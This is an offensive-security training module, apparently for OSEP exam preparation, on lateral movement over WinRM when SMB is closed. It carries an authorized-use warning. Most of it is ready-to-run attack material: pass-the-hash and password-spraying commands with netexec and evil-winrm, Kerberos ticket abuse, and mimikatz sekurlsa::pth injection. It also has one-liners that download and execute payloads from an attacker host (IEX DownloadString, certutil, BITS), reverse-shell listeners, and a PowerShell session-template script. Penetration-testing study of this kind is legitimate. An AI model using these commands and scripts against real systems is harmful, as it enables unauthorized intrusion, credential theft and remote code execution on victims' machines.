::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# WinRM lateral movement

If the credentials are valid but SMB (445) is closed, every path that depends on `admin$` (PsExec, WMIC, smbexec, copy-then-schtasks) is dead. Use WinRM on 5985/5986 as the execution channel instead.

PEN-300 Chapter 18 covers RDP and fileless (SCM-based) movement; WinRM/PSRemoting has no dedicated section. It is used here as the transport when those other channels are unavailable.

## Creds work, only WinRM is open

If 445 is closed and 5985 or 5986 is reachable, go straight to WinRM — don't spend time on PsExec-family tools. If 445 is actually open, this module is the wrong path.

The account must be in local `Administrators` or `Remote Management Users` on the target; domain membership alone is not enough. You need a password, an NTLM hash, or a Kerberos ticket.

- [ ] Confirm ports (`nmap -Pn -p445,5985,5986 TARGET`) and that the Kali tools are present
- [ ] Probe auth with netexec (plaintext, hash, or domain)
- [ ] Open an interactive session (evil-winrm, or PowerShell Remoting from a Windows pivot)
- [ ] Deliver the follow-on payload in-session without SMB
- [ ] If Kerberos is required: fix DNS, clock, and the ticket cache first

Confirm tools and reachability:

```bash
which evil-winrm netexec 2>/dev/null
gem list winrm 2>/dev/null | head -3    # evil-winrm depends on the winrm gem
# If evil-winrm is missing: sudo gem install evil-winrm  (or apt package evil-winrm)
nc -nvz TARGET 5985; nc -nvz TARGET 5986    # either open is enough
nmap -Pn -p445,5985,5986 TARGET
```

HTTPS (5986) needs `evil-winrm -S`. For Kerberos, put a resolvable FQDN in `/etc/hosts`, reach the KDC on TCP/88, and sync time (`ntpdate`/`chronyd`) — tickets fail hard on clock skew over 5 minutes.

Probe auth:

```bash
# plaintext
netexec winrm TARGET -u USER -p 'PASS'
# hash (Pass-the-Hash over NTLM)
netexec winrm TARGET -u USER -H NTHASH
# domain account
netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
# multi-target / spray (lockout risk — only when allowed and attempt-capped)
netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
```

`(Pwn3d!)` means local admin. Auth without that marker can still allow command execution (`Remote Management Users` need not be admins) — enter a session to verify.

Open a session with evil-winrm:

```bash
# plaintext (HTTP 5985)
evil-winrm -i TARGET -u USER -p 'PASS'
# explicit domain
evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
# NTLM hash (Pass-the-Hash)
evil-winrm -i TARGET -u USER -H NTHASH
# HTTPS (5986)
evil-winrm -i TARGET -u USER -p 'PASS' -S
# local scripts dir (local path only)
evil-winrm -i TARGET -u USER -p 'PASS' -s /opt/evil-winrm/scripts
```

The prompt becomes `*Evil-WinRM* PS C:\...>`. Run `whoami` and `whoami /priv` first. `upload` / `download` travel over the WinRM channel — no SMB.

For Kerberos, use an existing ccache; if you only have credentials, obtain a TGT first with `impacket-getTGT`. Configure the realm/KDC in `/etc/krb5.conf`, use the target FQDN, and keep clocks synchronized:

```bash
echo "TARGET-IP  target.dom" >> /etc/hosts
sudo ntpdate DC_IP || chronyc makestep     # clock skew vs DC < 5 minutes
impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/USER.ccache
evil-winrm -i target.dom -r DOMAIN.REALM    # realm must match /etc/krb5.conf; reads KRB5CCNAME
# alternative client using the same cache:
netexec winrm target.dom -d DOMAIN -u USER -k --use-kcache
```

For evil-winrm, `-r` selects Kerberos; `-k` is an SSL private-key path. The default SPN is `HTTP/target.dom` (override with `--spn` only when needed). DNS, KDC reachability, the cache identity, and target permissions still have to match.

If you have a Windows pivot, use built-in remoting (`Enter-PSSession -ComputerName target.dom -Authentication Kerberos` with the current domain identity), or explicit credentials:

```powershell
# single command
winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
# or a PSSession (templates: m15-winrm-auth-matrix.ps1)
$pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
$c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER',$pw)
$s  = New-PSSession -ComputerName TARGET -Credential $c
Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
```

`New-PSSession` accepts plaintext, not a native NTLM hash. If you only have a hash on Windows, inject it with mimikatz `sekurlsa::pth` and then `winrs`, or switch to `evil-winrm -H` on Kali.

Confirm execution in-session (auth ≠ execute):

```powershell
whoami
[Environment]::Is64BitOperatingSystem
Get-ExecutionPolicy -List          # affects script files, not interactive commands
```

Deliver the follow-on payload. Prefer in-memory; if a file is required, have the target download itself — do not assume `\\LHOST\share` works.

```powershell
# in-memory (preferred, no disk)
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')

# no disk: run a base64-wrapped script (UTF-16LE, the encoding -enc expects)
# attacker: iconv -t UTF-16LE stage2.ps1 | base64 -w0
$b64 = 'BASE64'
IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64)))

# on-disk fallback — target downloads itself
certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
Start-BitsTransfer -Source http://LHOST/PAYLOAD.exe -Destination C:\Windows\Temp\PAYLOAD.exe
```

Attacker side for in-memory delivery:

```bash
python3 -m http.server 80
nc -lvnp LPORT
```

If target egress is also blocked, use evil-winrm `upload` over 5985 itself and drop under `C:\Windows\Temp` or `%TEMP%`. Exfil the same way: write a temp file, then `download`.

If auth returns `Access is denied` / 401, the account is not in `Remote Management Users` or `Administrators` — check `-d` domain spelling, and confirm the hash is NTLM (32 hex), not LM or a Kerberos key. If 5986 works but 5985 does not, add `-S`; evil-winrm accepts self-signed certs by default. If auth is OK but commands fail or return empty, try `cmd /c whoami` and treat it as a constrained low-priv session (collect info; priv-esc via module 06). If evil-winrm will not start (Ruby/gem), switch to `netexec winrm` one-shots or the Windows pivot path. If Kerberos keeps failing (`KRB_AP_ERR_MODIFIED` / `KDC_ERR_*`), check `/etc/hosts`, clock, and `klist` expiry — then drop Kerberos and use `-H` if you have a hash.

A long job (mimikatz and similar) times out easily in evil-winrm: one line at a time, copy output immediately, or redirect to a file and `download`. Password spraying can lock accounts — cap attempts. NTLM hash auth leaves 4776 on the DC; Kerberos is quieter (tickets, no password on the wire). 5985 logons leave 4624/4625 plus WinRM operational logs.

::: details `m15-winrm-auth-matrix.ps1` · click to expand

````powershell
<#
# Purpose: WinRM lateral PowerShell Remoting auth templates (plaintext / NTLM hash / Kerberos)
#          One call: port precheck -> New-PSSession -> one-shot command or interactive session;
#          on failure, print triage directions.
# Scenario: 56 (SMB closed, WinRM only; Windows pivot path — Linux path in m15-winrm-lateral.md)
# Depends: Windows 10/Server 2016+ built-in; no third-party modules.
#          Hash path via mimikatz pth needs mimikatz.exe (-Mimikatz path).
# Usage:
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -Pass 'PASS' [-Domain DOMAIN] [-Interactive]
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET -User USER -NtHash NTHASH             # hash guidance in output
#   .\m15-winrm-auth-matrix.ps1 -Target TARGET.fqdn -User DOMAIN\USER -Kerberos      # current ticket
# Placeholders: TARGET=IP/hostname  USER=username  PASS=password  NTHASH=NTLM hash (32 hex)
#               DOMAIN=AD domain (optional, builds DOMAIN\USER)
# Test status: local syntax check only (PowerShell parser); not live-tested on a real domain/lab —
#              verify line-by-line in the OSEP lab network.
# Hard fact: New-PSSession only accepts plaintext; no native NTLM PTH — see -NtHash branch.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Target,          # target IP or FQDN
    [Parameter(Mandatory = $true)][string]$User,            # username (may include DOMAIN\ prefix)
    [string]$Pass,                                          # plaintext password
    [string]$NtHash,                                        # NTLM hash (32 hex)
    [string]$Domain,                                        # optional AD domain
    [switch]$Kerberos,                                      # Kerberos auth (domain)
    [switch]$Interactive,                                   # Enter-PSSession
    [switch]$UseSSL,                                        # target 5986 (HTTPS)
    [string]$Command = 'whoami; hostname',                  # default one-shot
    [string]$Mimikatz                                       # optional mimikatz.exe path for hash path
)

$ErrorActionPreference = 'Stop'

function Write-Step($msg)  { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok($msg)    { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail($msg)  { Write-Host "[-] $msg" -ForegroundColor Red }

# ---------- 0. Mutual-exclusion checks ----------
if (-not $Pass -and -not $NtHash -and -not $Kerberos) {
    Write-Fail "Provide one credential form: -Pass plaintext / -NtHash hash / -Kerberos (current ticket)."
    exit 1
}
if ($Pass -and $NtHash) {
    Write-Fail "-Pass and -NtHash both set; pick one."
    exit 1
}
if ($Domain) { $User = "$Domain\$User" }   # normalize to DOMAIN\User (keep .\USER when no Domain)

# ---------- 1. Port precheck (SMB closed is the premise — do not burn time on 445) ----------
Write-Step "Checking target WinRM ports 5985/5986 ..."
$http  = Test-NetConnection -ComputerName $Target -Port 5985 -WarningAction SilentlyContinue
$https = Test-NetConnection -ComputerName $Target -Port 5986 -WarningAction SilentlyContinue
if (-not $http.TcpTestSucceeded -and -not $https.TcpTestSucceeded) {
    Write-Fail "Neither 5985 nor 5986 reachable. Confirm ports (nmap -Pn -p5985,5986),
    or port-forward 5985/5986 from this pivot first (see module M08 tunneling)."
    exit 1
}
if ($UseSSL -and -not $https.TcpTestSucceeded) {
    Write-Fail "-UseSSL requires 5986, but 5986 is unreachable. Drop -UseSSL and use 5985."
    exit 1
}
if (-not $UseSSL -and -not $http.TcpTestSucceeded) { $UseSSL = $true }  # auto HTTPS if only 5986
Write-Ok "Ports reachable (5985=$($http.TcpTestSucceeded) 5986=$($https.TcpTestSucceeded)), using $($(if($UseSSL){'HTTPS'}else{'HTTP'}))."

# ---------- 2. Auth form dispatch ----------
$sessionOption = New-PSSessionOption -OperationTimeout 00:01:00 -OpenTimeout 00:01:00
if ($UseSSL) { $sessionOption = New-PSSessionOption -OperationTimeout 00:01:00 -OpenTimeout 00:01:00 -SkipCACheck -SkipCNCheck }

$cred = $null
if ($Pass) {
    # --- Template A: plaintext (most reliable; native New-PSSession) ---
    $secure = ConvertTo-SecureString $Pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($User, $secure)
    Write-Step "Template A: plaintext auth $User @ $Target"
    $params = @{
        ComputerName  = $Target
        Credential    = $cred
        SessionOption = $sessionOption
        ErrorAction   = 'Stop'
    }
    if ($UseSSL)  { $params.UseSSL = $true }
    if ($Kerberos){ $params.Authentication = 'Kerberos' }   # optional explicit Kerberos in-domain
}
elseif ($NtHash) {
    Write-Step "Template B: NTLM hash $User @ $Target"
    if ($Mimikatz -and (Test-Path $Mimikatz)) {
        Write-Step "Inject hash with mimikatz sekurlsa::pth, then re-run this script without -NtHash (or winrs) in the elevated process:"
        Write-Host ("    {0} ""sekurlsa::pth /user:{1} /domain:{2} /ntlm:{3} /run:powershell.exe""" -f `
            $Mimikatz, $User.Split('\')[-1], $(if($User.Contains('\')){$User.Split('\')[0]}else{'.'}), $NtHash)
        Write-Ok  "After PTH succeeds, in the new powershell: winrs -r:$Target whoami — or this script using the current token (no -Pass)."
    }
    else {
        Write-Host "[!] Windows has no native NTLM-PTH-over-WinRM. Two alternatives:"
        Write-Host "    1) Linux path (recommended): evil-winrm -i $Target -u $User -H $NtHash (see m15-winrm-lateral.md)"
        Write-Host "    2) Windows path: mimikatz sekurlsa::pth /user:$($User.Split('\')[-1]) /ntlm:$NtHash /run:powershell.exe,"
        Write-Host "       then in the new process: winrs -r:$Target whoami (token already holds the hash; NTLM auth)."
    }
    exit 0   # hash path does not build a session here — avoid a fake template that cannot work
}
elseif ($Kerberos) {
    Write-Step "Template C: Kerberos auth $User @ $Target"
    if ($Target -notmatch '\.') {
        Write-Fail "Kerberos needs FQDN: -Target must be target.dom, not a bare IP (SPN http/target.dom depends on it)."
        exit 1
    }
    # Kerberos with -Pass goes through template A (Authentication already set). Here: current-ticket only.
    $params = @{
        ComputerName  = $Target
        Authentication = 'Kerberos'
        SessionOption = $sessionOption
        ErrorAction   = 'Stop'
    }
    if ($UseSSL)  { $params.UseSSL = $true }
    if ($cred)    { $params.Credential = $cred }
}

# ---------- 3. Session + one-shot / interactive ----------
try {
    $session = New-PSSession @params
    Write-Ok "PSSession OK: $($session.ComputerName)  State=$($session.State)"
}
catch {
    Write-Fail "New-PSSession failed: $($_.Exception.Message)"
    Write-Host "==== Failure triage (check in order) ===="
    Write-Host "1) Auth 'Access is denied'/401: is the account in Administrators or Remote Management Users? Domain spelling via -Domain; local accounts use .\USER."
    Write-Host "2) Connectivity: does the pivot need a tunnel to 5985/5986? Client WinRM: Get-Service WinRM; Start-Service WinRM (0x803381xx same)."
    Write-Host "3) HTTPS certs: -SkipCACheck/-SkipCNCheck already applied; still failing → confirm 5986 really is WinRM."
    Write-Host "4) Kerberos KRB_AP_ERR_*: FQDN resolution, clock (<5min), SPN http/<target FQDN>."
    exit 1
}

if ($Interactive) {
    Write-Step "Entering interactive session (type exit to leave)..."
    Enter-PSSession -Session $session
    Remove-PSSession $session
}
else {
    Write-Step "Running command: $Command"
    try {
        Invoke-Command -Session $session -ScriptBlock ([scriptblock]::Create($Command))
        Write-Ok "Command finished."
    }
    catch {
        Write-Fail "Command failed: $($_.Exception.Message) (auth ≠ execute; non-admin Remote Management Users may be limited — try cmd /c whoami)"
    }
    Remove-PSSession $session
}
````

:::

::: details `m15-winrm-lateral.md` · click to expand

````markdown
# m15 · WinRM lateral quick-reference notes (Kali / evil-winrm / netexec)

> Scenario 56: valid creds, SMB closed, only 5985/5986 open. Linux attacker side;
>
> Windows pivot templates are in `m15-winrm-auth-matrix.ps1`.
>
> Placeholders: `TARGET`(IP/FQDN) `DOMAIN` `USER` `PASS` `NTHASH` `LHOST` `LPORT` `PAYLOAD` `URL`

## 1. Decide the path (≈30 seconds)

```bash
nmap -Pn -p445,5985,5986 TARGET          # only use this doc when 445 is closed; need 5985 or 5986
nc -nvz TARGET 5985; nc -nvz TARGET 5986
```

## 2. Auth + rights probe

```bash
# plaintext
netexec winrm TARGET -u USER -p 'PASS'
# NTLM hash (Pass-the-Hash)
netexec winrm TARGET -u USER -H NTHASH
# domain account
netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
# multi-target batch (careful — lockout risk)
netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
```

- `(Pwn3d!)` = local admin on the target → command execution usually unconstrained.
- `[+]` without `(Pwn3d!)` = auth OK but not admin; may still be Remote Management Users — enter a session to verify.

## 3. Interactive session (evil-winrm)

```bash
# plaintext HTTP (5985)
evil-winrm -i TARGET -u USER -p 'PASS'
# explicit domain
evil-winrm -i TARGET -u 'DOMAIN\USER' -p 'PASS'
# NTLM hash
evil-winrm -i TARGET -u USER -H NTHASH
# HTTPS (5986)
evil-winrm -i TARGET -u USER -p 'PASS' -S
# local scripts/dict dirs (local paths only)
evil-winrm -i TARGET -u USER -p 'PASS' -s /opt/evil-winrm/scripts
```

In-session basics:

```text
*Evil-WinRM* PS> whoami ; whoami /priv
*Evil-WinRM* PS> upload ./PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe   # WinRM channel; no SMB
*Evil-WinRM* PS> download C:\Windows\Temp\result.txt ./result.txt
*Evil-WinRM* PS> menu          # built-ins (services/reg/loot, …)
```

> Note: evil-winrm `menu` `services`/`reg` use its built-ins; for long password-dump jobs prefer one-liners and copy output immediately.

## 4. Kerberos path (domain; works without SMB; needs ticket/DNS/clock)

```bash
# Prerequisites: resolvable FQDN + time sync
echo "TARGET-IP  target.dom" >> /etc/hosts
sudo ntpdate DC_IP || chronyc makestep     # clock skew vs DC <5 minutes

# password → TGT (ccache), or reuse an existing .ccache
impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/USER.ccache

# ticket auth (Target must be FQDN)
evil-winrm -i target.dom -r DOMAIN.REALM    # realm must match /etc/krb5.conf; reads KRB5CCNAME
# alternative client using the same cache:
netexec winrm target.dom -d DOMAIN -u USER -k --use-kcache
```

- evil-winrm Kerberos support is weak; for interactive Kerberos prefer Windows pivot `Enter-PSSession -Authentication Kerberos` (template C in m15-winrm-auth-matrix.ps1).
- `KRB_AP_ERR_MODIFIED` / `KDC_ERR_*`: check `/etc/hosts`, clock, `klist` expiry, then SPN via `impacket-GetUserSPNs` or `ldapsearch`.

## 5. In-session payload delivery (two channels without SMB)

### 5.1 In-memory (preferred, no disk)

Attacker delivery:

```bash
python3 -m http.server 80            # or python3 -m http.server 443
# reverse listener
nc -lvnp LPORT
```

Inside evil-winrm:

```powershell
# download and run .ps1
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')

# no disk: run a base64-wrapped script in memory (UTF-16LE, the encoding -enc expects)
# attacker: iconv -t UTF-16LE stage2.ps1 | base64 -w0
$b64 = 'BASE64'
IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64)))
```

### 5.2 On-disk (only if needed: target downloads itself — never `\\LHOST\share`)

```powershell
certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.exe
# alternatives
Start-BitsTransfer -Source http://LHOST/PAYLOAD.exe -Destination C:\Windows\Temp\PAYLOAD.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/PAYLOAD.exe','C:\Windows\Temp\PAYLOAD.exe')"
```

Then run: `C:\Windows\Temp\PAYLOAD.exe` (admin session can run directly; non-admin: collect info under least privilege first).

### 5.3 Exfil (target → attacker, bypass egress limits)

```text
# write results to a temp file, then download over WinRM (no target egress needed)
*Evil-WinRM* PS> whoami /all | Out-File C:\Windows\Temp\out.txt -Encoding ascii
*Evil-WinRM* PS> download C:\Windows\Temp\out.txt ./out.txt
```

## 6. Common failures

| Symptom | Cause / fix |
|---|---|
| `Access is denied` / 401 | Not in Remote Management Users/Administrators; check `-d` domain spelling |
| Auth OK but no `(Pwn3d!)` | Non-admin; enter session and test execution |
| 5986 cert errors | evil-winrm accepts self-signed by default; still failing → confirm it is WinRM TLS |
| `KRB_AP_ERR_MODIFIED` | Clock skew / hosts resolution — not a password problem |
| evil-winrm won’t start | Broken Ruby/gem → switch to netexec winrm or Windows path |
| Long commands hang | Split into one-liners; redirect output to a file then `download` |

## 7. Exam / OPSEC notes

- 5985 logons leave 4624/4625 + WinRM operational logs; password spraying can lock accounts — control attempts.
- NTLM hash auth leaves 4776 on the DC; quieter option is Kerberos (tickets, no password on the wire).
- Long jobs (mimikatz sekurlsa::logonpasswords) time out easily in evil-winrm: one line at a time, copy output, then continue.
````

:::

## Cheat sheet

| You want to… | Use |
|---|---|
| Decide if this module applies | `nmap -Pn -p445,5985,5986 TARGET` |
| Probe auth (password / hash / domain) | `netexec winrm TARGET -u USER -p 'PASS'` / `-H NTHASH` / `-d DOMAIN` |
| Interactive session | `evil-winrm -i TARGET -u USER -p 'PASS'` (add `-H` or `-S` as needed) |
| Kerberos without SMB | `impacket-getTGT` + `KRB5CCNAME` + `netexec winrm … -k --use-kcache` |
| In-session, no disk | `IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')` |
| Windows pivot | `winrs` / `New-PSSession` (`m15-winrm-auth-matrix.ps1`) |
| On-disk fallback | `certutil` / BITS — target downloads itself, never `\\LHOST\share` |
